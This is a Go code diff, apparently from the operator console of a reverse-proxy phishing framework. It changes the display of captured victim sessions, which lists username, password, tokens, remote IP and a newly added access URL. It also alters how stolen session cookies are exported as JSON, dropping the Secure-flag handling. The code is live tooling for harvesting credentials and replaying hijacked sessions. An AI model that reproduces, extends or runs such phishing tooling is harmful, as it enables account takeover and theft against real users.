@@ -395,8 +395,8 @@ func (t *Terminal) handleSessions(args []string) error {
 					tcol = lgreen.Sprintf("captured")
 				}
 
-				keys := []string{"id", "phishlet", "username", "password", "tokens", "landing url", "user-agent", "remote ip", "create time", "update time"}
-				vals := []string{strconv.Itoa(s.Id), lred.Sprint(s.Phishlet), lblue.Sprint(s.Username), lblue.Sprint(s.Password), tcol, yellow.Sprint(s.LandingURL), dgray.Sprint(s.UserAgent), yellow.Sprint(s.RemoteAddr), dgray.Sprint(time.Unix(s.CreateTime, 0).Format("2006-01-02 15:04")), dgray.Sprint(time.Unix(s.UpdateTime, 0).Format("2006-01-02 15:04"))}
+				keys := []string{"id", "phishlet", "username", "password", "tokens", "landing url", "user-agent", "remote ip", "create time", "update time", "access url"}
+				vals := []string{strconv.Itoa(s.Id), lred.Sprint(s.Phishlet), lblue.Sprint(s.Username), lblue.Sprint(s.Password), tcol, yellow.Sprint(s.LandingURL), dgray.Sprint(s.UserAgent), yellow.Sprint(s.RemoteAddr), dgray.Sprint(time.Unix(s.CreateTime, 0).Format("2006-01-02 15:04")), dgray.Sprint(time.Unix(s.UpdateTime, 0).Format("2006-01-02 15:04")), yellow.Sprint(s.AccessURL)}
 				log.Printf("\n%s\n", AsRows(keys, vals))
 
 				if len(s.Custom) > 0 {
@@ -1207,7 +1207,6 @@ func (t *Terminal) cookieTokensToJSON(pl *Phishlet, tokens map[string]map[string
 		Name           string `json:"name"`
 		HttpOnly       bool   `json:"httpOnly,omitempty"`
 		HostOnly       bool   `json:"hostOnly,omitempty"`
-		Secure         bool   `json:"secure,omitempty"`
 	}
 
 	var cookies []*Cookie
@@ -1220,10 +1219,6 @@ func (t *Terminal) cookieTokensToJSON(pl *Phishlet, tokens map[string]map[string
 				Value:          v.Value,
 				Name:           k,
 				HttpOnly:       v.HttpOnly,
-				Secure:         false,
-			}
-			if strings.Index(k, "__Host-") == 0 || strings.Index(k, "__Secure-") == 0 {
-				c.Secure = true
 			}
 			if domain[:1] == "." {
 				c.HostOnly = false
@@ -1262,7 +1257,7 @@ func (t *Terminal) checkStatus() {
 
 func (t *Terminal) manageCertificates(verbose bool) {
 	if !t.p.developer {
-		hosts := t.p.cfg.GetActiveHostnames("")
+		hosts := t.p.cfg.GetActiveHostnames("") // get all active hostnames
 		//wc_host := t.p.cfg.GetWildcardHostname()
 		//hosts := []string{wc_host}
 		//hosts = append(hosts, t.p.cfg.GetActiveHostnames("")...)
